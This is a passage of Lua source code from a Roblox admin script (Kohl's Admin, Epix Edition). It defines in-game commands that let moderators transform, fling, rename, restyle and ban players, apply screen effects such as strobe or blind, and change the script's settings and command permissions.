repeat
if set.lighttask==false then return end
game:service('Lighting').Ambient = Color3.new(1,1,1)
game:service('Lighting').OutdoorAmbient = Color3.new(1,1,1)
game:service('Lighting').FogColor = Color3.new(1,1,1)
game:service('Lighting').Brightness = 1
game:service('Lighting').TimeOfDay = 14
wait(0.1) 
game:service('Lighting').Ambient = Color3.new(0,0,0)
game:service('Lighting').OutdoorAmbient = Color3.new(0,0,0)
game:service('Lighting').FogColor = Color3.new(0,0,0)
game:service('Lighting').Brightness = 0
game:service('Lighting').TimeOfDay = 0
wait(0.1)
until set.lighttask==false
end)()
end)

set.MakeCommand('Makes the target player(s) spin',-1,set.Prefix,{'spin'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for i,v in pairs(v.Character.Torso:children()) do if v.Name == "SPINNER" then v:Destroy() end end
local torso = v.Character:findFirstChild("Torso")
local bg = Instance.new("BodyGyro", torso) bg.Name = "SPINNER" bg.maxTorque = Vector3.new(0,math.huge,0) bg.P = 11111 bg.cframe = torso.CFrame table.insert(set.objects,bg)
repeat wait(1/44) bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(30),0)
until not bg or bg.Parent ~= torso
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) stop spinning',-1,set.Prefix,{'unspin'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a,q in pairs(v.Character.Torso:children()) do if q.Name == "SPINNER" then q:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a dog',-1,set.Prefix,{'dog','dogify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 1
v.Character.Torso.Neck.C0 = CFrame.new(0,-.5,-2) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1.5,-1,1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1.5,-1,1.5) * CFrame.Angles(0,math.rad(-90),0)
local new = Instance.new("Seat", v.Character) new.Name = "FAKETORSO" new.formFactor = "Symmetric" new.TopSurface = 0 new.BottomSurface = 0 new.Size = Vector3.new(3,1,4) new.CFrame = v.Character.Torso.CFrame
local bf = Instance.new("BodyForce", new) bf.force = Vector3.new(0,new:GetMass()*196.25,0)
local weld = Instance.new("Weld", v.Character.Torso) weld.Part0 = v.Character.Torso weld.Part1 = new weld.C0 = CFrame.new(0,-.5,0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Brown") elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Brown") end end
end
end)()
end
end)

set.MakeCommand('Turn them back to normal',-1,set.Prefix,{'undog','undogify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a creeper',-1,set.Prefix,{'creeper','creeperify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Bright green") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Bright green") end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) back to normal',-1,set.Prefix,{'uncreeper','uncreeperify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end)()
end
end)

set.MakeCommand('Give the target player(s) a larger ego',-1,set.Prefix,{'bighead'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(3,3,3) v.Character.Torso.Neck.C0 = CFrame.new(0,1.9,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end)()
end
end)

set.MakeCommand('Resize the target player(s)\'s character by <number>',-1,set.Prefix,{'resize','size'},{'player','number'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
	 if not (v and v.Character and v.Character:findFirstChild('Torso') and v.Character:findFirstChild('HumanoidRootPart')) then return end
		local ags = {c = v.Character, t = v.Character.Torso, r = v.Character.HumanoidRootPart}
		ags.t.Anchored = true ags.t.BottomSurface = 0 ags.t.TopSurface = 0
		local welds = {} --Credit to Drezmor for the orig command, credit to Kohltastrophe for making it work correctly l0l
		for i2,v2 in pairs(ags.c:children()) do
		if v2:IsA('BasePart') then v2.Anchored = true
		elseif v2:IsA('Pants') or v2:IsA('Shirt') then v2.Parent = ags.t
		end
		end
		print(args[2])
		local function size(p)
		for i2,v2 in pairs(p:children()) do
		if v2:IsA('Weld') or v2:IsA('Motor') or v2:IsA('Motor6D') then
		local p1 = v2.Part1 p1.Anchored = true v2.Part1 = nil
		local r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12 = v2.C0:components() v2.C0 = CFrame.new(r1*args[2],r2*args[2],r3*args[2],r4,r5,r6,r7,r8,r9,r10,r11,r12)
		local r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12 = v2.C1:components() v2.C1 = CFrame.new(r1*args[2],r2*args[2],r3*args[2],r4,r5,r6,r7,r8,r9,r10,r11,r12)
		if p1.Name ~= 'Head' and p1.Name ~= 'Torso' then
		p1.formFactor = 3
		p1.Size = p1.Size*args[2]
		elseif p1.Name ~= 'Torso' then
		p1.Anchored = true
		for i3,v3 in pairs(p1:children()) do if v3:IsA('Weld') then v3.Part0 = nil v3.Part1.Anchored = true end end
		p1.formFactor = 3 p1.Size = p1.Size*args[2]
		for i3,v3 in pairs(p1:children()) do if v3:IsA('Weld') then v3.Part0 = p1 v3.Part1.Anchored = false end end
		end
		if v2.Parent == ags.t then p1.BottomSurface = 0 p1.TopSurface = 0 end
		p1.Anchored = false
		v2.Part1 = p1
		if v2.Part0 == ags.t then table.insert(welds,v2) p1.Anchored = true v2.Part0 = nil end
		elseif v2:IsA('CharacterMesh') then
		local bp = tostring(v2.BodyPart):match('%w+.%w+.(%w+)')
		local msh = Instance.new('SpecialMesh')
		if bp and ags.c:findFirstChild(bp) then msh.Parent = ags.c:findFirstChild(bp) end
		msh.MeshId = 'http://www.roblox.com/asset/?id='..v2.MeshId
		if v2.BaseTextureId ~= 0 or v2.BaseTextureId ~= '0' then msh.TextureId = 'http://www.roblox.com/asset/?id='..v2.BaseTextureId end
		msh.Scale = msh.Scale*args[2] v2:Destroy()
		elseif v2:IsA('SpecialMesh') and v2.Parent ~= ags.c.Head then v2.Scale = v2.Scale*args[2]
		end size(v2)
		end
		end
		size(ags.c)
		ags.t.formFactor = 3
		ags.t.Size = ags.t.Size*args[2]
		for i2,v2 in pairs(welds) do v2.Part0 = ags.t v2.Part1.Anchored = false end
		for i2,v2 in pairs(ags.c:children()) do if v2:IsA('BasePart') then v2.Anchored = false end end
		local weld = Instance.new('Weld',ags.r) weld.Part0 = ags.r weld.Part1 = ags.t
	end
end)

set.MakeCommand('Give the target player(s) a small head',-1,set.Prefix,{'smallhead','minihead'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(.75,.75,.75) v.Character.Torso.Neck.C0 = CFrame.new(0,.8,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end)()
end
end)

set.MakeCommand('Fling the target player(s)',2,set.Prefix,{'fling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then 
local xran local zran
repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
v.Character.Humanoid.Sit = true v.Character.Torso.Velocity = Vector3.new(0,0,0)
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character spazz out on the floor',-1,set.Prefix,{'seizure'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character:FindFIrstChild('Torso') then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(math.rad(90),0,0) 
set.Remote(v,'Function','Effect','seizure')
end
end)()
end
end)

set.MakeCommand('Removes the effects of the seizure command',-1,set.Prefix,{'unseizure'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
set.Remote(v,'Function','Effect','unseizure')
end
end)

set.MakeCommand('Remove the target player(s)\'s arms and legs',-1,set.Prefix,{'removelimbs','delimb'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") and (obj.Name:find("Leg") or obj.Name:find("Arm")) then obj:Destroy() end
end
end
end)()
end
end)

set.MakeCommand('Name the target player(s) <name> or say hide to hide their character name',2,set.Prefix,{'name','rename'},{'player','name/hide'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character and v.Character:findFirstChild("Head") then 
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
local char = v.Character
local head = char:FindFirstChild('Head')
local mod = Instance.new("Model", char) mod.Name = args[2] or ''
local cl = char.Head:Clone() cl.Parent = mod 
local hum = Instance.new("Humanoid", mod) hum.Name = "NameTag" hum.MaxHealth = 0 hum.Health = 0
coroutine.wrap(function()
if args[2]:lower()~='hide' then
	repeat hum.MaxHealth=hum.MaxHealth hum.Health=v.Character.Humanoid.Health wait() until not v or not v.Parent or not char or not head or not hum or not mod or not mod.Parent or mod==nil or hum==nil or not hum.Parent
else
	mod.Name=''
end
end)()
cl.CanCollide=false
local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
char.Head.Transparency = 1
end
end)()
end
end)

set.MakeCommand('Put the target player(s)\'s back to normal',2,set.Prefix,{'unname','fixname'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Head") then 
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Change the target player(s)\'s Right Leg package',-1,set.Prefix,{'rleg','rightleg','rightlegpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=31 then set.Remote(plr,'Function','OutputGui','Id is not a right leg!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='RightLeg' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Leg package',-1,set.Prefix,{'lleg','leftleg','leftlegpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=30 then set.Remote(plr,'Function','OutputGui','Id is not a left leg!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='LeftLeg' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Right Arm package',-1,set.Prefix,{'rarm','rightarm','rightarmpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=28 then set.Remote(plr,'Function','OutputGui','Id is not a right arm!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='RightArm' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Arm package',-1,set.Prefix,{'larm','leftarm','leftarmpackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=29 then set.Remote(plr,'Function','OutputGui','Id is not a left arm!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='LeftArm' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Change the target player(s)\'s Left Arm package',-1,set.Prefix,{'torso','torsopackage'},{'player','id'},2,function(plr,args)
	local id=game:service('MarketplaceService'):GetProductInfo(args[2]).AssetTypeId
	if id~=27 then set.Remote(plr,'Function','OutputGui','Id is not a torso!') return end
	local part=game:service('InsertService'):LoadAsset(args[2]):children()[1]
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		for k,m in pairs(v.Character:children()) do if m:IsA('CharacterMesh') and m.BodyPart=='Torso' then m:Destroy() end end
		part.Parent=v.Character
	end
end)

set.MakeCommand('Changes the target player(s)\'s character appearence to <ID>',-1,set.Prefix,{'char','character','appearance'},{'player','ID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. args[2]
v:LoadCharacter()
end
end)()
end
end)

set.MakeCommand('Put the target player(s)\'s character appearence back to normal',-1,set.Prefix,{'unchar','uncharacter','fixappearance'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. v.userId
v:LoadCharacter()
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a suit zombie',-1,set.Prefix,{'infect','zombify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
set.Infect(v.Character)
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character flash random colors',-1,set.Prefix,{'rainbowify','rainbow'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
set.Remote(v,'Function','Effect','rainbowify')
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character flash',-1,set.Prefix,{'flashify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
set.Remote(v,'Function','Effect','flashify')
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look like a noob',-1,set.Prefix,{'noobify','noob'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
set.Noobify(v.Character)
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a ghost',-1,set.Prefix,{'ghostify','ghost'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
set.Remote(v,'Function','Noclip','norm')
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = .5 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Institutional white")
if prt.Name:find("Leg") then prt.Transparency = 1 end
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = .5 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look like gold',-1,set.Prefix,{'goldify','gold'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = .4 prt.BrickColor = BrickColor.new("Bright yellow")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = .4 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s)\'s character shiney',-1,set.Prefix,{'shiney','shineify','shine'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 1 prt.BrickColor = BrickColor.new("Institutional white")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 1 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end)()
end
end)

set.MakeCommand('Make the target player(s) look normal',-1,set.Prefix,{'normal','normalify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Head") then v.Character.Head.Mesh.Scale = Vector3.new(1.25,1.25,1.25) end 
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
local parent=v:FindFirstChild('PlayerGui') or v:FindFirstChild('Backpack')
for a, sc in pairs(parent:children()) do if sc.Name == set.GuiName.."ify" or sc.Name==set.GuiName..'Glitch' or sc.Name == set.GuiName.."KohlsPoison" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do
if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("White")
if prt.Name == "FAKETORSO" then prt:Destroy() end
if prt.Name == 'HumanoidRootPart' then prt.Transparency=1 end
elseif prt:findFirstChild("NameTag") then 
	prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("White")
elseif prt.Name=='Kohls Puke' or prt.Name=='Kohls Bleed' then
	prt:Destroy()
elseif prt.Name==v.Name..'kohlscrusify' then
	set.RunCommand('refresh',v.Name)
end 
end
end
end)()
end
end)

set.MakeCommand('Makes the target player(s)\'s screen rapidly change colors',-1,set.Prefix,{'trippy'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','trippy')
end
end)

set.MakeCommand('Removes any effects on the target player(s)',-1,set.Prefix,{'uneffect','uneffectgui','unblind','unstrobe','untrippy','undance','unflashify','unrainbowify','guifix','fixgui'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','off')
end
end)

set.MakeCommand('Reverses the effects of the iceskate/slip command',-1,set.Prefix,{'unslip','unslippery','uniceskate'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i,v in pairs(plrz) do
set.Remote(v,'Function','Effect','unslip')
end
end)

set.MakeCommand('Makes the target player(s)\'s screen flash rapidly',-1,set.Prefix,{'strobe'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','strobe')
end
end)

set.MakeCommand('Blinds the target player(s)',-1,set.Prefix,{'blind'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','blind')
end
end)

set.MakeCommand('Loop heals the target player(s)',2,set.Prefix,{'loopheal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','loopheal')
end
end)

set.MakeCommand('UnLoop Heal',2,set.Prefix,{'unloopheal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopheal')
end
end)

set.MakeCommand('Loop flings the target player(s)',-1,set.Prefix,{'loopfling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
	set.Remote(v,'Function','Effect','loopfling')
end
end)

set.MakeCommand('UnLoop Fling',-1,set.Prefix,{'unloopfling'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopfling')
end
end)

-------------------------
-- True Owner Commands --
-------------------------
set.MakeCommand('Force the target player(s) to teleport to the desired place',5,set.Prefix,{'forceplace'},{'player','placeid'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
game:GetService('TeleportService'):Teleport(args[2],v)
end)()
end
end)

set.MakeCommand('Force the script to update, buggy',5,set.Prefix,{'!updatekohls!'},{},1,function(plr,args)
local m=Instance.new('Message',workspace)
m.Text="Updating Kohl's Admin [Epix Edition] [MANUAL MODE]"
local mo=game:GetService('InsertService'):LoadAsset(145629584)
local news=mo:children()[1]
_G["Kohls Admin [Epix Edit] Update"]=set
news.Parent=game:service('ServerScriptService')
mo:Destroy()
wait(1)
m.Text='Breaking old version and respawning players...'
wait(1)
m:Destroy()
set=nil
RemoteEvent:Destroy()
script.Parent=nil
script.Disabled=true
script:Destroy()
for i,v in pairs(game:service('Players'):GetPlayers()) do
	v:LoadCharacter()
end
error('Breaking Old Version')
end)

set.MakeCommand('Ban the target player(s) forever',5,set.Prefix,{'permban'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(plr,'Function','PromptPermBan',v)
end
end)

set.MakeCommand('View and change settings',5,set.Prefix,{'settings'},{},0,function(plr,args)
for i,v in pairs(UpdatableSettings) do
	if set[v]~=nil then set.Remote(plr,'SetSetting',v,set[v]) end
end
set.Remote(plr,'SetSetting','UpdatableSettings',UpdatableSettings)
wait(1)
set.Remote(plr,'Function','Settings')
end)

set.MakeCommand('Change command permissions',5,set.Prefix,{'perms','permissions','comperms'},{set.Prefix..'cmd','all/donor/temp/admin/owner/creator'},2,function(plr,args)
	local level=nil
	if args[2]:lower()=='all' or args[2]:lower()=='0' then
		level=0
	elseif args[2]:lower()=='donor' or args[2]:lower()=='1' then
		level=1
	elseif args[2]:lower()=='temp' or args[2]:lower()=='2' then
		level=2
	elseif args[2]:lower()=='admin' or args[2]:lower()=='3' then
		level=3
